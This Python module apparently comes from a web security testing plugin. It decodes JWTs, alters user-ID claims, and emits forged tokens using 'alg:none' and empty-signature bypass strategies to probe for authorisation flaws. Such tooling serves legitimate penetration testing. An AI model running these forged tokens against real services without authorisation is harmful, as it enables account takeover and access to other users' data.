import base64
import json
import re
import os
import sys

# Add common to path
try:
    _common_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "../../../common/python")
    if _common_path not in sys.path: sys.path.append(_common_path)
except NameError:
    pass

class JWTIDORLogic:
    def __init__(self):
        self.id_patterns = ['id', 'user_id', 'uid', 'account', 'sub', 'owner']

    def decode_jwt(self, token):
        parts = token.split('.')
        if len(parts) != 3: return None
        try:
            def b64_decode(s):
                missing_padding = len(s) % 4
                if missing_padding: s += '=' * (4 - missing_padding)
                return json.loads(base64.b64decode(s.replace('-', '+').replace('_', '/')))

            header = b64_decode(parts[0])
            payload = b64_decode(parts[1])
            return header, payload, parts[2]
        except:
            return None

    def encode_jwt(self, header, payload, signature=""):
        def b64_encode(obj):
            json_str = json.dumps(obj, separators=(',', ':'))
            # Jython 2.7/Python 2 compatibility: str and bytes are same
            # Python 3 compatibility: encode to bytes
            if sys.version_info[0] >= 3:
                json_str = json_str.encode('utf-8')
            s = base64.b64encode(json_str).decode('utf-8') if sys.version_info[0] >= 3 else base64.b64encode(json_str)
            s = s.replace('=', '').replace('+', '-').replace('/', '_')
            return s

        return b64_encode(header) + "." + b64_encode(payload) + "." + signature

    def generate_mutations(self, token):
        decoded = self.decode_jwt(token)
        if not decoded: return []

        header, payload, signature = decoded
        mutations = []

        for key, value in payload.items():
            if any(p in key.lower() for p in self.id_patterns):
                # 1. Test alg: none bypass for each mutation
                none_header = header.copy()
                none_header['alg'] = 'none'

                # Mutation strategies
                variants = []
                if isinstance(value, int):
                    variants.append(value + 1)
                    variants.append(value - 1)
                    variants.append(0)
                elif isinstance(value, basestring if sys.version_info[0] < 3 else str):
                    if value.isdigit():
                        variants.append(str(int(value) + 1))
                        variants.append(str(int(value) - 1))
                    elif re.match(r'^[0-9a-fA-F]+$', value):
                        # Hex/ObjectID manipulation (change last char)
                        if len(value) > 0:
                            last_char = value[-1]
                            new_char = '1' if last_char == '0' else '0'
                            variants.append(value[:-1] + new_char)

                    variants.append("admin")
                    variants.append("")

                for v in variants:
                    mutated_payload = payload.copy()
                    mutated_payload[key] = v

                    # Add alg:none variant
                    mutations.append({
                        'field': key,
                        'original': value,
                        'mutated': v,
                        'token': self.encode_jwt(none_header, mutated_payload, ""),
                        'strategy': 'alg:none'
                    })

                    # Add original alg but empty signature (some libs only check if signature exists)
                    mutations.append({
                        'field': key,
                        'original': value,
                        'mutated': v,
                        'token': self.encode_jwt(header, mutated_payload, ""),
                        'strategy': 'empty-sig'
                    })

        return mutations
